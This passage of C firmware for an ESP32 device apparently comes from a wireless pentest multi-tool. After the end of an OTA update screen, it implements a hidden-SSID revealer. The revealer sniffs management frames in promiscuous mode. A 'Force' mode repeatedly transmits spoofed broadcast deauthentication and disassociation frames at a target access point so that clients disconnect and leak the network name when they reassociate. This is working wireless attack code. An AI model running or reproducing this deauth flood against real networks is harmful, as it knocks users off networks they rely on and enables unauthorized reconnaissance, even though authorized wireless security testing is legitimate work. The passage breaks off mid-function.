  FirmwareUpdate_fw_mdns_active = mdns_init() == ESP_OK;
  if (FirmwareUpdate_fw_mdns_active) {
    mdns_hostname_set(FirmwareUpdate_host);
    mdns_instance_name_set("ESP32 Firmware Update");
    mdns_service_add(NULL, "_http", "_tcp", 80, NULL, 0);
  }
  display_set_text_color_2(&(tft), TFT_GREEN, TFT_BLACK);
  display_set_cursor(&(tft), 10, 110 + FirmwareUpdate_yshift);
  display_print_line_cstr(
      &(tft),
      (TEXT(FirmwareUpdate_fw_mdns_active ? "mDNS OK" : "Use IP address above"))
          .data);
  display_set_text_color_2(&(tft), TFT_WHITE, TFT_BLACK);
  display_set_cursor(&(tft), 10, 120 + FirmwareUpdate_yshift);
  display_print_line_cstr(&(tft), "Web server ready!");
  display_set_cursor(&(tft), 10, 130 + FirmwareUpdate_yshift);
  display_print_line_cstr(&(tft), "Access via browser");

  if (!FirmwareUpdate_fwStartHttpServer()) {
    FirmwareUpdate_fwUpdateUiFail();
    int x, y;
    if (FirmwareUpdate_waitForTouchXY(&(x), &(y))) {
      network_disconnect_options(false, false);
      FirmwareUpdate_drawMenu();
      return;
    }
    FirmwareUpdate_fwStopHttpServer();
    network_disconnect_options(false, false);
    FirmwareUpdate_drawMenu();
    return;
  }

  FirmwareUpdate_fwEnsureToolbar();
  uint32_t lastInputMs = 0;
  while (true) {
    if (atomic_load(&(FirmwareUpdate_update_complete))) {
      FirmwareUpdate_fwUpdateUiSuccess();
      sys_sleep_ms(1500);
      esp_restart();
    }
    const uint32_t now = sys_monotonic_ms();
    if ((uint32_t)(now - lastInputMs) >= 50u) {
      lastInputMs = now;
      if (featureHasTouchNavBar()) {
        maintainTouchNavBar();
      }
      if (feature_exit_requested ||
          FirmwareUpdate_fwActionPressed("Back", 0, 0, false)) {
        FirmwareUpdate_fwStopHttpServer();
        network_disconnect_options(false, false);
        return;
      }
      int x, y;
      if (readTouchXY(&(x), &(y)) &&
          FirmwareUpdate_fwActionPressed("Back", x, y, true)) {
        FirmwareUpdate_fwStopHttpServer();
        network_disconnect_options(false, false);
        FirmwareUpdate_drawMenu();
        return;
      }
    }
    sys_sleep_ms(1);
  }
}

void FirmwareUpdate_updateSetup(void) {
  FirmwareUpdate_fwResetNavCache();
  display_fill_screen(&(tft), TFT_BLACK);
  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);

  display_set_text_color_2(&(tft), TFT_WHITE, TFT_BLACK);
  display_set_text_size(&(tft), 1);

  setupTouchscreen();

  FirmwareUpdate_uiDrawn = false;

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true, false);
  FirmwareUpdate_runUI();

  FirmwareUpdate_drawMenu();
}

void FirmwareUpdate_updateLoop(void) {
  if (featureHasTouchNavBar()) {
    maintainTouchNavBar();
    if (isTouchNavButtonPressedEdge(BTN_LEFT)) {
      feature_exit_requested = true;
      return;
    }
  } else if (feature_active && isButtonPressed(BTN_SELECT)) {
    feature_exit_requested = true;
    return;
  }

  updateStatusBar();
  FirmwareUpdate_runUI();
  if (feature_exit_requested) return;

  if (FirmwareUpdate_fwActionPressed("Back", 0, 0, false)) {
    feature_exit_requested = true;
    sys_sleep_ms(200);
    return;
  }

  int x, y;
  if (readTouchXY(&(x), &(y))) {
    if (FirmwareUpdate_fwActionPressed("Back", x, y, true)) {
      feature_exit_requested = true;
      sys_sleep_ms(200);
      return;
    }
    if (FirmwareUpdate_checkButton(x, y, BUTTON1_X, BUTTON1_Y, BUTTON_WIDTH,
                                   BUTTON_HEIGHT)) {
      FirmwareUpdate_performSDUpdate();
    } else if (FirmwareUpdate_checkButton(x, y, BUTTON2_X, BUTTON2_Y,
                                          BUTTON_WIDTH, BUTTON_HEIGHT)) {
      FirmwareUpdate_performWebOTAUpdate();
    }
    sys_sleep_ms(200);
  }
}

#undef SCREEN_WIDTH
#define SCREEN_WIDTH 240
#undef SCREEN_HEIGHT
#define SCREEN_HEIGHT 320
#undef STATUS_BAR_Y_OFFSET
#define STATUS_BAR_Y_OFFSET 20
#undef STATUS_BAR_HEIGHT
#define STATUS_BAR_HEIGHT 16
#undef ICON_SIZE
#define ICON_SIZE 16
#undef ICON_NUM
#define ICON_NUM 2

enum { HiddenSsidReveal_LIST_HEADER_Y = 50 };
enum {
  HiddenSsidReveal_LIST_FIRST_ROW_Y = HiddenSsidReveal_LIST_HEADER_Y + 20
};
enum { HiddenSsidReveal_LIST_ROW_H = 22 };
enum { HiddenSsidReveal_MAX_HIDDEN_APS = 40 };
static const unsigned long HiddenSsidReveal_LISTEN_HOP_MS = 1500;
static const unsigned long HiddenSsidReveal_BTN_DEBOUNCE_MS = 200;

typedef struct HiddenSsidReveal_HiddenAp {
  uint8_t bssid[6];
  int8_t rssi;
  uint8_t channel;
  wifi_auth_mode_t authmode;
  char revealed[33];
  bool has_name;
} HiddenSsidReveal_HiddenAp;
#define HiddenSsidReveal_HiddenAp_INITIALIZER {0}
;

static HiddenSsidReveal_HiddenAp
    HiddenSsidReveal_s_aps[HiddenSsidReveal_MAX_HIDDEN_APS];
static int HiddenSsidReveal_s_count = 0;
static int HiddenSsidReveal_s_currentIndex = 0;
static int HiddenSsidReveal_s_currentPage = 0;
static int HiddenSsidReveal_s_selectedIndex = -1;
static bool HiddenSsidReveal_s_scanning = false;
static bool HiddenSsidReveal_s_listening = false;
static bool HiddenSsidReveal_s_forcing = false;
static bool HiddenSsidReveal_s_uiDrawn = false;
static unsigned long HiddenSsidReveal_s_lastBtnMs = 0;
static uint32_t HiddenSsidReveal_s_mgmtFrames = 0;
static uint32_t HiddenSsidReveal_s_ssidHits = 0;
static uint32_t HiddenSsidReveal_s_deauthSent = 0;
static unsigned long HiddenSsidReveal_s_listenStartedMs = 0;
static unsigned long HiddenSsidReveal_s_lastStatusMs = 0;
static unsigned long HiddenSsidReveal_s_lastHopMs = 0;
static unsigned long HiddenSsidReveal_s_lastDeauthMs = 0;
static int HiddenSsidReveal_s_hopPos = 0;
static bool HiddenSsidReveal_s_listenAll = false;
static int HiddenSsidReveal_s_lastRenderedIndex = -1;
static int HiddenSsidReveal_s_lastRenderedPage = -1;
static bool HiddenSsidReveal_s_revealUiDrawn = false;
static uint32_t HiddenSsidReveal_s_lastDrawnDeauth = 0xFFFFFFFF;
static uint32_t HiddenSsidReveal_s_lastDrawnMgmt = 0xFFFFFFFF;
static uint32_t HiddenSsidReveal_s_lastDrawnHits = 0xFFFFFFFF;
static bool HiddenSsidReveal_s_lastDrawnForcing = false;
static bool HiddenSsidReveal_s_lastDrawnListening = false;
static bool HiddenSsidReveal_s_lastDrawnHasName = false;

static const unsigned long HiddenSsidReveal_DEAUTH_INTERVAL_MS = 80;

static const uint8_t HiddenSsidReveal_s_deauthTemplate[26] = {
    0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0x00, 0x00, 0x07, 0x00};
static uint8_t HiddenSsidReveal_s_deauthFrame[26];

static volatile bool HiddenSsidReveal_s_revealPending = false;
static volatile int HiddenSsidReveal_s_revealIndex = -1;
static char HiddenSsidReveal_s_pendingSsid[33] = {0};
static portMUX_TYPE HiddenSsidReveal_s_revealMux = portMUX_INITIALIZER_UNLOCKED;

static void HiddenSsidReveal_drawRevealScreen_0(void);
static void HiddenSsidReveal_drawRevealScreen_1(bool fullRedraw);
static void HiddenSsidReveal_updateRevealStats(void);
static void HiddenSsidReveal_updateNavLabels(bool onRevealScreen);
static void HiddenSsidReveal_startListening(bool withForce);
static void HiddenSsidReveal_stopListening(void);
static void HiddenSsidReveal_drawScanScreen_0(void);
static void HiddenSsidReveal_drawScanScreen_1(bool fullRedraw);

static int HiddenSsidReveal_networksPerPage(void) {
  return DIV_MAX(1, (wifiListBottomY() - HiddenSsidReveal_LIST_FIRST_ROW_Y) /
                        HiddenSsidReveal_LIST_ROW_H);
}

static void HiddenSsidReveal_updateNavLabels(bool onRevealScreen) {
  if (!featureHasTouchNavBar()) {
    return;
  }
  if (onRevealScreen) {
    setTouchNavLabels(HiddenSsidReveal_s_forcing ? "Stop" : "Force", NULL,
                      "Exit", HiddenSsidReveal_s_listening ? NULL : "Listen",
                      "Back");
  } else {
    setTouchNavLabels("Rescan", "Next", "Exit", "Prev", "Reveal");
  }
  redrawTouchButtonBar();
}

static int HiddenSsidReveal_compareHiddenAp(const void* a, const void* b) {
  const HiddenSsidReveal_HiddenAp* ap1 = (const HiddenSsidReveal_HiddenAp*)a;
  const HiddenSsidReveal_HiddenAp* ap2 = (const HiddenSsidReveal_HiddenAp*)b;
  return (int)ap2->rssi - (int)ap1->rssi;
}

static bool HiddenSsidReveal_parseSsidIe(const uint8_t* ie, int ieLen,
                                         char* out, size_t outSz) {
  if (!ie || ieLen < 2 || !out || outSz < 2) {
    return false;
  }
  int off = 0;
  while (off + 2 <= ieLen) {
    const uint8_t id = ie[off];
    const uint8_t len = ie[off + 1];
    if (off + 2 + len > ieLen) {
      break;
    }
    if (id == 0) {
      if (len == 0 || len > 32) {
        return false;
      }
      bool allZero = true;
      for (uint8_t i = 0; i < len; i++) {
        if (ie[off + 2 + i] != 0) {
          allZero = false;
          break;
        }
      }
      if (allZero) {
        return false;
      }
      const size_t n = DIV_MIN((size_t)len, outSz - 1);
      memcpy(out, &ie[off + 2], n);
      out[n] = '\0';
      return true;
    }
    off += 2 + len;
  }
  return false;
}

static int HiddenSsidReveal_findApByBssid(const uint8_t* bssid) {
  if (!bssid) {
    return -1;
  }
  for (int i = 0; i < HiddenSsidReveal_s_count; i++) {
    if (memcmp(HiddenSsidReveal_s_aps[i].bssid, bssid, 6) == 0) {
      return i;
    }
  }
  return -1;
}

static void HiddenSsidReveal_queueReveal(int index, const char* ssid) {
  if (index < 0 || index >= HiddenSsidReveal_s_count || !ssid || !ssid[0]) {
    return;
  }
  if (HiddenSsidReveal_s_aps[index].has_name &&
      strcmp(HiddenSsidReveal_s_aps[index].revealed, ssid) == 0) {
    return;
  }
  portENTER_CRITICAL(&HiddenSsidReveal_s_revealMux);
  strncpy(HiddenSsidReveal_s_pendingSsid, ssid,
          sizeof(HiddenSsidReveal_s_pendingSsid) - 1);
  HiddenSsidReveal_s_pendingSsid[sizeof(HiddenSsidReveal_s_pendingSsid) - 1] =
      '\0';
  HiddenSsidReveal_s_revealIndex = index;
  HiddenSsidReveal_s_revealPending = true;
  portEXIT_CRITICAL(&HiddenSsidReveal_s_revealMux);
}

static void HiddenSsidReveal_snifferCallback(void* buf,
                                             wifi_promiscuous_pkt_type_t type) {
  if (!feature_active || !HiddenSsidReveal_s_listening ||
      type != WIFI_PKT_MGMT) {
    return;
  }

  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  if (!pkt) {
    return;
  }

  const uint8_t* p = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  // ESP-IDF may include FCS in sig_len
  if (len > 4) {
    len -= 4;
  }
  if (len < 24) {
    return;
  }

  HiddenSsidReveal_s_mgmtFrames++;

  const uint8_t frameCtl = p[0];
  if ((frameCtl & 0x0C) != 0x00) {
    return;  // not management
  }
  const uint8_t subtype = frameCtl & 0xF0;

  const uint8_t* bssid = NULL;
  int ieOff = -1;

  switch (subtype) {
    case 0x50:  // Probe Response
      bssid = p + 16;
      ieOff = 24 + 12;
      break;
    case 0x00:  // Association Request
      bssid = p + 4;
      ieOff = 24 + 4;
      break;
    case 0x20:  // Reassociation Request
      bssid = p + 4;
      ieOff = 24 + 10;
      break;
    case 0x40: {  // Probe Request (directed only)
      const uint8_t* addr1 = p + 4;
      static const uint8_t kBcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
      if (memcmp(addr1, kBcast, 6) != 0) {
        bssid = addr1;
      } else {
        const uint8_t* addr3 = p + 16;
        if (memcmp(addr3, kBcast, 6) != 0) {
          bssid = addr3;
        }
      }
      ieOff = 24;
      break;
    }
    default:
      return;
  }

  if (!bssid || ieOff < 0 || ieOff >= len) {
    return;
  }

  char ssid[33];
  if (!HiddenSsidReveal_parseSsidIe(p + ieOff, len - ieOff, ssid,
                                    sizeof(ssid))) {
    return;
  }

  HiddenSsidReveal_s_ssidHits++;
  const int idx = HiddenSsidReveal_findApByBssid(bssid);
  if (idx >= 0) {
    if (!HiddenSsidReveal_s_listenAll &&
        HiddenSsidReveal_s_selectedIndex >= 0 &&
        idx != HiddenSsidReveal_s_selectedIndex) {
      return;
    }
    HiddenSsidReveal_queueReveal(idx, ssid);
  }
}

static void HiddenSsidReveal_stopListening(void) {
  HiddenSsidReveal_s_forcing = false;
  HiddenSsidReveal_s_listening = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
}

static void HiddenSsidReveal_sendForceDeauth(const uint8_t* bssid,
                                             uint8_t channel) {
  if (!bssid) {
    return;
  }
  if (channel < 1 || channel > 14) {
    channel = 1;
  }
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  // AP -> stations (broadcast)
  memcpy(HiddenSsidReveal_s_deauthFrame, HiddenSsidReveal_s_deauthTemplate,
         sizeof(HiddenSsidReveal_s_deauthFrame));
  HiddenSsidReveal_s_deauthFrame[0] = 0xC0;
  memset(&HiddenSsidReveal_s_deauthFrame[4], 0xFF, 6);
  memcpy(&HiddenSsidReveal_s_deauthFrame[10], bssid, 6);
  memcpy(&HiddenSsidReveal_s_deauthFrame[16], bssid, 6);
  if (esp_wifi_80211_tx(WIFI_IF_AP, HiddenSsidReveal_s_deauthFrame,
                        sizeof(HiddenSsidReveal_s_deauthFrame),
                        false) == ESP_OK)
    ++HiddenSsidReveal_s_deauthSent;

  // Stations -> AP
  memcpy(HiddenSsidReveal_s_deauthFrame, HiddenSsidReveal_s_deauthTemplate,
         sizeof(HiddenSsidReveal_s_deauthFrame));
  HiddenSsidReveal_s_deauthFrame[0] = 0xC0;
  memcpy(&HiddenSsidReveal_s_deauthFrame[4], bssid, 6);
  memset(&HiddenSsidReveal_s_deauthFrame[10], 0xFF, 6);
  memcpy(&HiddenSsidReveal_s_deauthFrame[16], bssid, 6);
  if (esp_wifi_80211_tx(WIFI_IF_AP, HiddenSsidReveal_s_deauthFrame,
                        sizeof(HiddenSsidReveal_s_deauthFrame),
                        false) == ESP_OK)
    ++HiddenSsidReveal_s_deauthSent;

  // Disassoc broadcast as well
  memcpy(HiddenSsidReveal_s_deauthFrame, HiddenSsidReveal_s_deauthTemplate,
         sizeof(HiddenSsidReveal_s_deauthFrame));
  HiddenSsidReveal_s_deauthFrame[0] = 0xA0;
  memset(&HiddenSsidReveal_s_deauthFrame[4], 0xFF, 6);
  memcpy(&HiddenSsidReveal_s_deauthFrame[10], bssid, 6);
  memcpy(&HiddenSsidReveal_s_deauthFrame[16], bssid, 6);
  if (esp_wifi_80211_tx(WIFI_IF_AP, HiddenSsidReveal_s_deauthFrame,
                        sizeof(HiddenSsidReveal_s_deauthFrame),
                        false) == ESP_OK)
    ++HiddenSsidReveal_s_deauthSent;
}

static void HiddenSsidReveal_startListening(bool withForce) {
  if (HiddenSsidReveal_s_count <= 0) {
    return;
  }

  uint8_t ch = 1;
  if (HiddenSsidReveal_s_listenAll) {
    HiddenSsidReveal_s_hopPos = 0;
    ch = HiddenSsidReveal_s_aps[0].channel;
  } else if (HiddenSsidReveal_s_selectedIndex >= 0 &&
             HiddenSsidReveal_s_selectedIndex < HiddenSsidReveal_s_count) {
    ch = HiddenSsidReveal_s_aps[HiddenSsidReveal_s_selectedIndex].channel;
  }
  if (ch < 1 || ch > 14) {
    ch = 1;
  }

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);

  // SoftAP gives us WIFI_IF_AP for raw deauth TX while promiscuous sniffs
  // rejoins.
  network_set_mode(WIFI_MODE_AP);
  sys_sleep_ms(30);
  wifi_config_t ap_config = {0};
  strncpy((char*)ap_config.ap.ssid, "ESP32-DIV", sizeof(ap_config.ap.ssid));
  ap_config.ap.ssid_len = 9;
  ap_config.ap.password[0] = '\0';
  ap_config.ap.authmode = WIFI_AUTH_OPEN;
  ap_config.ap.ssid_hidden = 1;
  ap_config.ap.max_connection = 4;
  ap_config.ap.beacon_interval = 100;
  ap_config.ap.channel = ch;
  esp_wifi_set_config(WIFI_IF_AP, &ap_config);
  esp_wifi_start();
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

  esp_wifi_set_promiscuous_rx_cb(HiddenSsidReveal_snifferCallback);
  esp_wifi_set_promiscuous(true);

  HiddenSsidReveal_s_listening = true;
  HiddenSsidReveal_s_forcing = withForce;
  HiddenSsidReveal_s_mgmtFrames = 0;
  HiddenSsidReveal_s_ssidHits = 0;
  if (withForce) {
    HiddenSsidReveal_s_deauthSent = 0;
  }
  HiddenSsidReveal_s_listenStartedMs = sys_monotonic_ms();
  HiddenSsidReveal_s_lastHopMs = sys_monotonic_ms();
  HiddenSsidReveal_s_lastDeauthMs = 0;
  HiddenSsidReveal_s_lastStatusMs = 0;
}

static void HiddenSsidReveal_toggleForce(void) {
  if (HiddenSsidReveal_s_forcing) {
    HiddenSsidReveal_s_forcing = false;
    HiddenSsidReveal_updateRevealStats();
    HiddenSsidReveal_updateNavLabels(true);
    return;
  }
  if (!HiddenSsidReveal_s_listening) {
    HiddenSsidReveal_startListening(true);
  } else {
    HiddenSsidReveal_s_forcing = true;
    HiddenSsidReveal_s_deauthSent = 0;
    HiddenSsidReveal_s_lastDeauthMs = 0;
  }
  HiddenSsidReveal_updateRevealStats();
  HiddenSsidReveal_updateNavLabels(true);
}

static void HiddenSsidReveal_drawButton(int x, int y, int w, int h,
                                        const char* label, bool highlight,
                                        bool disabled) {
  FeatureUI_ButtonStyle style = highlight ? FeatureUI_ButtonStyle_Primary
                                          : FeatureUI_ButtonStyle_Secondary;
  FeatureUI_drawButtonRect(x, y, w, h, label, style, false, disabled, 1);
}

static void HiddenSsidReveal_drawTabBar(
    const char* leftButton, bool leftDisabled, const char* prevButton,
    bool prevDisabled, const char* nextButton, bool nextDisabled) {
  if (featureHasTouchNavBar()) {
    HiddenSsidReveal_updateNavLabels(HiddenSsidReveal_s_selectedIndex >= 0 ||
                                     HiddenSsidReveal_s_listenAll);
    return;
  }

  display_fill_rect(&(tft), 0, 304, SCREEN_WIDTH, 16, FEATURE_BG);
  if (leftButton && leftButton[0]) {
    HiddenSsidReveal_drawButton(0, 304, 57, 16, leftButton, false,
                                leftDisabled);
  }
  if (prevButton && prevButton[0]) {
    HiddenSsidReveal_drawButton(117, 304, 57, 16, prevButton, false,
                                prevDisabled);
  }
  if (nextButton && nextButton[0]) {
    HiddenSsidReveal_drawButton(177, 304, 57, 16, nextButton, false,
                                nextDisabled);
  }
}

static void HiddenSsidReveal_drawApRow(int i, int y, bool isSel) {
  char buf[64];
  char name[16];
  if (HiddenSsidReveal_s_aps[i].has_name &&
      HiddenSsidReveal_s_aps[i].revealed[0]) {
    strncpy(name, HiddenSsidReveal_s_aps[i].revealed, 11);
    name[11] = '\0';
    if (strlen(HiddenSsidReveal_s_aps[i].revealed) > 11) {
      strcat(name, "...");
    }
  } else {
    snprintf(
        name, sizeof(name), "%02X%02X%02X%02X",
        HiddenSsidReveal_s_aps[i].bssid[2], HiddenSsidReveal_s_aps[i].bssid[3],
        HiddenSsidReveal_s_aps[i].bssid[4], HiddenSsidReveal_s_aps[i].bssid[5]);
  }

  const char* tag = HiddenSsidReveal_s_aps[i].has_name ? "OK" : "??";
  snprintf(buf, sizeof(buf), "%02d: %-14s %3d Ch%2d %s", i + 1, name,
           HiddenSsidReveal_s_aps[i].rssi, HiddenSsidReveal_s_aps[i].channel,
           tag);

  display_fill_rect(&(tft), 0, y, SCREEN_WIDTH, HiddenSsidReveal_LIST_ROW_H,
                    TFT_BLACK);
  display_set_cursor(&(tft), 2, y);
  display_set_text_color_1(&(tft), isSel ? ORANGE : FEATURE_BG);
  display_print(&(tft), (TEXT(isSel ? ">" : " ")).data);
  display_set_cursor(&(tft), 10, y);
  display_set_text_color_1(
      &(tft),
      isSel ? ORANGE : (HiddenSsidReveal_s_aps[i].has_name ? GREEN : WHITE));
  display_print_line_cstr(&(tft), (TEXT(buf)).data);
}

static void HiddenSsidReveal_drawScanScreen_1(bool fullRedraw) {
  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
  display_set_text_size(&(tft), 1);

  if (HiddenSsidReveal_s_scanning) {
    wifiClearBody(TFT_BLACK);
    HiddenSsidReveal_s_lastRenderedIndex = -1;
    HiddenSsidReveal_s_lastRenderedPage = -1;
    display_set_cursor(&(tft), 10, 50);
    display_set_text_color_1(&(tft), GREEN);
    display_print_line_cstr(&(tft), "Scanning.");
    loading(100, ORANGE, 0, 0, 3, true);
    display_set_cursor(&(tft), 10, 65);
    display_print_line_cstr(&(tft), "Finding hidden SSIDs.");
    return;
  }

  if (HiddenSsidReveal_s_count == 0) {
    wifiClearBody(TFT_BLACK);
    HiddenSsidReveal_s_lastRenderedIndex = -1;
    HiddenSsidReveal_s_lastRenderedPage = -1;
    display_set_text_color_1(&(tft), GREEN);
    display_set_cursor(&(tft), 10, 50);
    display_print_line_cstr(&(tft), "No hidden SSIDs found.");
    display_set_cursor(&(tft), 10, 65);
    display_print_line_cstr(&(tft), "Press Rescan.");
    HiddenSsidReveal_drawTabBar("Rescan", false, "Prev", true, "Next", true);
    return;
  }

  const int perPage = HiddenSsidReveal_networksPerPage();
  if (HiddenSsidReveal_s_currentIndex < 0) {
    HiddenSsidReveal_s_currentIndex = 0;
  }
  if (HiddenSsidReveal_s_currentIndex >= HiddenSsidReveal_s_count) {
    HiddenSsidReveal_s_currentIndex = DIV_MAX(0, HiddenSsidReveal_s_count - 1);
  }
  HiddenSsidReveal_s_currentPage =
      HiddenSsidReveal_s_currentIndex / DIV_MAX(1, perPage);

  const bool pageChanged =
      (HiddenSsidReveal_s_currentPage != HiddenSsidReveal_s_lastRenderedPage);
  const bool needFull =
      fullRedraw || pageChanged || (HiddenSsidReveal_s_lastRenderedIndex < 0);

  if (!needFull &&
      HiddenSsidReveal_s_lastRenderedIndex != HiddenSsidReveal_s_currentIndex) {
    const int prev = HiddenSsidReveal_s_lastRenderedIndex;
    const int now = HiddenSsidReveal_s_currentIndex;
    if (prev >= HiddenSsidReveal_s_currentPage * perPage &&
        prev < HiddenSsidReveal_s_currentPage * perPage + perPage) {
      const int row = prev - HiddenSsidReveal_s_currentPage * perPage;
      HiddenSsidReveal_drawApRow(
          prev,
          HiddenSsidReveal_LIST_FIRST_ROW_Y + row * HiddenSsidReveal_LIST_ROW_H,
          false);
    }
    if (now >= HiddenSsidReveal_s_currentPage * perPage &&
        now < HiddenSsidReveal_s_currentPage * perPage + perPage) {
      const int row = now - HiddenSsidReveal_s_currentPage * perPage;
      HiddenSsidReveal_drawApRow(
          now,
          HiddenSsidReveal_LIST_FIRST_ROW_Y + row * HiddenSsidReveal_LIST_ROW_H,
          true);
    }
    HiddenSsidReveal_s_lastRenderedIndex = HiddenSsidReveal_s_currentIndex;
    return;
  }

  if (!needFull) {
    return;
  }

  wifiClearBody(TFT_BLACK);
  HiddenSsidReveal_s_revealUiDrawn = false;

  display_set_text_color_1(&(tft), GREEN);
  display_set_cursor(&(tft), 10, HiddenSsidReveal_LIST_HEADER_Y);
  display_print_line_cstr(&(tft), "Hidden SSIDs:");

  char page_buf[32];
  snprintf(page_buf, sizeof(page_buf), "Page %d/%d",
           HiddenSsidReveal_s_currentPage + 1,
           DIV_MAX(1, (HiddenSsidReveal_s_count + perPage - 1) / perPage));
  display_set_cursor(&(tft), 180, HiddenSsidReveal_LIST_HEADER_Y);
  display_set_text_color_1(&(tft), GREEN);
  display_print_line_cstr(&(tft), (TEXT(page_buf)).data);

  int y = HiddenSsidReveal_LIST_FIRST_ROW_Y;
  const int start_index = HiddenSsidReveal_s_currentPage * perPage;
  const int end_index =
      DIV_MIN(start_index + perPage, HiddenSsidReveal_s_count);
  for (int i = start_index; i < end_index && y < wifiListBottomY(); i++) {
    HiddenSsidReveal_drawApRow(i, y, i == HiddenSsidReveal_s_currentIndex);
    y += HiddenSsidReveal_LIST_ROW_H;
  }

  HiddenSsidReveal_drawTabBar(
      "Rescan", false, "Prev", HiddenSsidReveal_s_currentIndex <= 0, "Next",
      HiddenSsidReveal_s_currentIndex >= HiddenSsidReveal_s_count - 1);
  HiddenSsidReveal_s_lastRenderedIndex = HiddenSsidReveal_s_currentIndex;
  HiddenSsidReveal_s_lastRenderedPage = HiddenSsidReveal_s_currentPage;
}

static void HiddenSsidReveal_drawScanScreen_0(void) {
  HiddenSsidReveal_drawScanScreen_1(true);
}

static void HiddenSsidReveal_fillRevealLine(int y, const char* text,
                                            uint16_t color) {
  display_fill_rect(&(tft), 0, y, SCREEN_WIDTH, 12, TFT_BLACK);
  display_set_text_color_2(&(tft), color, TFT_BLACK);
  display_set_cursor(&(tft), 10, y);
  display_print(&(tft), (TEXT(text)).data);
}

static void HiddenSsidReveal_updateRevealStats(void) {
  if (!HiddenSsidReveal_s_revealUiDrawn) {
    HiddenSsidReveal_drawRevealScreen_1(true);
    return;
  }

  const HiddenSsidReveal_HiddenAp* ap = NULL;
  if (!HiddenSsidReveal_s_listenAll && HiddenSsidReveal_s_selectedIndex >= 0 &&
      HiddenSsidReveal_s_selectedIndex < HiddenSsidReveal_s_count) {
    ap = &HiddenSsidReveal_s_aps[HiddenSsidReveal_s_selectedIndex];
  }

  char buf[64];
  const bool statusChanged =
      (HiddenSsidReveal_s_lastDrawnForcing != HiddenSsidReveal_s_forcing) ||
      (HiddenSsidReveal_s_lastDrawnListening != HiddenSsidReveal_s_listening);
  if (statusChanged) {
    if (HiddenSsidReveal_s_forcing) {
      HiddenSsidReveal_fillRevealLine(90, "Status: Forcing reveal", ORANGE);
    } else if (HiddenSsidReveal_s_listening) {
      HiddenSsidReveal_fillRevealLine(90, "Status: Listening", ORANGE);
    } else {
      HiddenSsidReveal_fillRevealLine(90, "Status: Stopped", UI_DIM_TEXT);
    }
    HiddenSsidReveal_s_lastDrawnForcing = HiddenSsidReveal_s_forcing;
    HiddenSsidReveal_s_lastDrawnListening = HiddenSsidReveal_s_listening;

    if (HiddenSsidReveal_s_forcing) {
      HiddenSsidReveal_fillRevealLine(200, "Force: deauth clients so they",
                                      UI_DIM_TEXT);
      HiddenSsidReveal_fillRevealLine(214, "reassociate and leak SSID.",
                                      UI_DIM_TEXT);
    } else {
      HiddenSsidReveal_fillRevealLine(200, "Force kicks clients to elicit",
                                      UI_DIM_TEXT);
      HiddenSsidReveal_fillRevealLine(214, "assoc/probe frames with SSID.",
                                      UI_DIM_TEXT);
    }
  }

  if (HiddenSsidReveal_s_lastDrawnDeauth != HiddenSsidReveal_s_deauthSent) {
    snprintf(buf, sizeof(buf), "Deauth TX: %lu", HiddenSsidReveal_s_deauthSent);
    HiddenSsidReveal_fillRevealLine(110, buf, WHITE);
    HiddenSsidReveal_s_lastDrawnDeauth = HiddenSsidReveal_s_deauthSent;
  }

  if (HiddenSsidReveal_s_lastDrawnMgmt != HiddenSsidReveal_s_mgmtFrames ||
      HiddenSsidReveal_s_lastDrawnHits != HiddenSsidReveal_s_ssidHits) {
    snprintf(buf, sizeof(buf), "Mgmt RX: %lu  SSID IE: %lu",
             HiddenSsidReveal_s_mgmtFrames, HiddenSsidReveal_s_ssidHits);
    HiddenSsidReveal_fillRevealLine(125, buf, WHITE);
    HiddenSsidReveal_s_lastDrawnMgmt = HiddenSsidReveal_s_mgmtFrames;
    HiddenSsidReveal_s_lastDrawnHits = HiddenSsidReveal_s_ssidHits;
  }

  const bool hasName = ap && ap->has_name;
  if (hasName != HiddenSsidReveal_s_lastDrawnHasName) {
    display_fill_rect(&(tft), 0, 168, SCREEN_WIDTH, 14, TFT_BLACK);
    display_set_cursor(&(tft), 10, 168);
    if (ap && ap->has_name) {
      display_set_text_color_2(&(tft), ORANGE, TFT_BLACK);
      display_print(&(tft), (TEXT(ap->revealed)).data);
    } else if (HiddenSsidReveal_s_listenAll) {
      int revealed = 0;
      for (int i = 0; i < HiddenSsidReveal_s_count; i++) {
        if (HiddenSsidReveal_s_aps[i].has_name) {
          revealed++;
        }
      }
      display_set_text_color_2(&(tft), ORANGE, TFT_BLACK);
      snprintf(buf, sizeof(buf), "%d / %d recovered", revealed,
               HiddenSsidReveal_s_count);
      display_print(&(tft), (TEXT(buf)).data);
    } else {
      display_set_text_color_2(&(tft), UI_DIM_TEXT, TFT_BLACK);
      display_print(&(tft), "(waiting for rejoin...)");
    }
    HiddenSsidReveal_s_lastDrawnHasName = hasName;
  }
}

static void HiddenSsidReveal_drawRevealScreen_1(bool fullRedraw) {
  if (!fullRedraw && HiddenSsidReveal_s_revealUiDrawn) {
    HiddenSsidReveal_updateRevealStats();
    return;
  }

  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
  wifiClearBody(TFT_BLACK);
  display_set_text_size(&(tft), 1);
  HiddenSsidReveal_s_lastRenderedIndex = -1;
  HiddenSsidReveal_s_lastRenderedPage = -1;

  char buf[64];
  const HiddenSsidReveal_HiddenAp* ap = NULL;
  if (!HiddenSsidReveal_s_listenAll && HiddenSsidReveal_s_selectedIndex >= 0 &&
      HiddenSsidReveal_s_selectedIndex < HiddenSsidReveal_s_count) {
    ap = &HiddenSsidReveal_s_aps[HiddenSsidReveal_s_selectedIndex];
  }

  display_set_text_color_1(&(tft), WHITE);
  display_set_cursor(&(tft), 10, 50);
  if (HiddenSsidReveal_s_listenAll) {
